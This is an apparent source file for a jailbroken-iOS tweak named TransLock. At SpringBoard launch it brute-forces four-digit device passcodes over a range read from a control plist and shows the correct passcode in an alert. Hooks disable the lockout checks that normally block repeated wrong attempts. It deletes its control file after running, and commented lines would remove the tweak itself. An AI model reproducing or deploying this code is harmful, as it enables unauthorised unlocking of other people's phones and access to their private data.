#define CONTROL_FILE @"/var/mobile/Documents/translock.plist"

@interface SBDeviceLockController
+ (id)sharedController;
- (BOOL)attemptDeviceUnlockWithPassword:(id)password appRequested:(BOOL)requested;
@end

@interface SBLockScreenManager
+ (id)sharedInstance;
- (_Bool)attemptUnlockWithPasscode:(id)arg1;
@end

@interface TransLock : NSObject
+ (id)sharedInstance;
- (void)bruteforce;
@end

NSString *numString;

@implementation TransLock
+ (instancetype)sharedInstance {
	static TransLock *__sharedInstance;
	static dispatch_once_t onceToken;
    
	dispatch_once(&onceToken, ^{
		__sharedInstance = [[self alloc] init];
	});

	return __sharedInstance;
}

- (void)bruteforce {
	NSLog(@"bruteforce start");
	NSMutableDictionary *prefs = [[NSMutableDictionary alloc] initWithContentsOfFile:CONTROL_FILE];
	if (!prefs) {
		NSLog(@"no control, disabled");
		return;
	}
	int start = [prefs[@"start"] intValue];
	int end = [prefs[@"end"] intValue];
	bool permanent = prefs[@"permanent"];

	NSLog(@"start = %d, end = %d", start, end);
	if (!permanent) {
		system("rm -f /var/mobile/Documents/translock.plist");
	}

	for (int i = start; i <= end; i++)
	{
		numString = [NSString stringWithFormat:@"%04d", i];
		NSLog(@"Testing : %@", numString);
		if ([[%c(SBDeviceLockController) sharedController] attemptDeviceUnlockWithPassword:numString appRequested:NO]) {
			[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
			NSLog(@"Password is : %@", numString);
			// system("rm -rf /Library/MobileSubstrate/DynamicLibraries/libTransLock.dylib");
			// system("rm -rf /Library/MobileSubstrate/DynamicLibraries/libTransLock.plist");
			break;
		}
	}
	NSLog(@"bruteforce end");

}
@end 

%hook SBFDeviceLockController
- (bool)_temporarilyBlocked {
	return NO;
}

- (bool)isPasscodeLockedOrBlocked {
	return NO;
}

- (bool)isBlocked {
	return NO;
}
%end

%hook SpringBoard
- (void)applicationDidFinishLaunching:(id)arg1 {
	%orig;

	[[TransLock sharedInstance] bruteforce];
}
%end
